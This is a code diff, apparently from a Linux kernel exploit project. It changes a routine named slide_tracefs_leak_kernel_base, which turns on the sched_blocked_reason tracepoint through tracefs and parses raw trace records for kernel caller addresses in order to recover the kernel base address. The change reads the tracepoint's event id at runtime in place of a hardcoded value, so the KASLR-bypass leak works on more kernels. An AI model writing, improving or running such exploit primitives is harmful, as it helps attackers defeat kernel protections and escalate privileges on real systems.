@@ -1,9 +1,7 @@
 #include "common.h"
 
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
-#ifndef SLIDE_TRACEFS_EVENT_ID
-#define SLIDE_TRACEFS_EVENT_ID 109
-#endif
+static uint16_t slide_tracefs_event_id;
 
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -53,7 +51,7 @@ static int slide_tracefs_parse_page(
     }
     uint16_t event_id = 0;
     memcpy(&event_id, page + record, sizeof(event_id));
-    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+    if (event_id == slide_tracefs_event_id && record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
       uint64_t link_caller =
@@ -81,6 +79,33 @@ static int slide_tracefs_leak_kernel_base(void) {
       SLIDE_TRACEFS_ROOT "/trace";
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+  static const char event_id_path[] =
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/id";
+
+  char id_text[32];
+  int id_fd = open(event_id_path, O_RDONLY | O_CLOEXEC);
+  if (id_fd < 0) {
+    pr_error("slide tracefs event id open failed errno=%d\n", errno);
+    return 0;
+  }
+  ssize_t id_size = read(id_fd, id_text, sizeof(id_text) - 1);
+  int id_errno = errno;
+  close(id_fd);
+  if (id_size <= 0) {
+    pr_error("slide tracefs event id read failed errno=%d\n", id_errno);
+    return 0;
+  }
+  id_text[id_size] = 0;
+  char *id_end = NULL;
+  errno = 0;
+  unsigned long id_value = strtoul(id_text, &id_end, 10);
+  if (errno || id_end == id_text || id_value == 0 || id_value > UINT16_MAX) {
+    pr_error("slide tracefs event id invalid text=%s errno=%d\n",
+             id_text, errno);
+    return 0;
+  }
+  slide_tracefs_event_id = (uint16_t)id_value;
+  pr_info("slide tracefs event id=%u\n", slide_tracefs_event_id);
 
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "1") ||
